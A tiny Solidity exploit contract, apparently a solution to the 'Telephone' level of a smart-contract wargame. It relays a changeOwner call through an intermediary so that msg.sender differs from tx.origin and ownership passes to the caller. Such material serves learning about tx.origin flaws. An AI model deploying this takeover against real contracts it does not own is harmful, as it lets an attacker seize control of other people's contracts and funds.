// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract takeOverContract {
  function changeOwner(address _addy) public {
    ITelephone(_addy).changeOwner(msg.sender);
  }
}